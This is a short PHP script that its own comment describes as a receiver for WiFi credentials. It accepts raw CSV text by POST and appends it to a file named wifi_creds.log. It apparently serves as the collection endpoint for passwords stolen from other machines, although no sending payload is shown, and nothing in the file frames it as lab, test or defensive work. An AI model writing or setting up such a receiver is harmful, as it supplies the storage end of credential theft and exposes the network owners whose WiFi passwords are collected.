<?php
// Receiver for WiFi credentials.
// Expects raw CSV text in POST body and appends it to wifi_creds.log.

$logFile = __DIR__ . '/wifi_creds.log';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo 'NO';
    exit;
}

// Read raw body
$raw = file_get_contents('php://input');
if ($raw === false || trim($raw) === '') {
    echo 'NO';
    exit;
}

// Normalize line endings and trim
$raw = str_replace("\r\n", "\n", $raw);
$raw = trim($raw);

// Make sure log file exists
if (!file_exists($logFile)) {
    touch($logFile);
}

// Append with newline separator
$fh = fopen($logFile, 'a');
if ($fh) {
    fwrite($fh, $raw . "\n");
    fclose($fh);
    echo 'OK';
} else {
    echo 'NO';
}
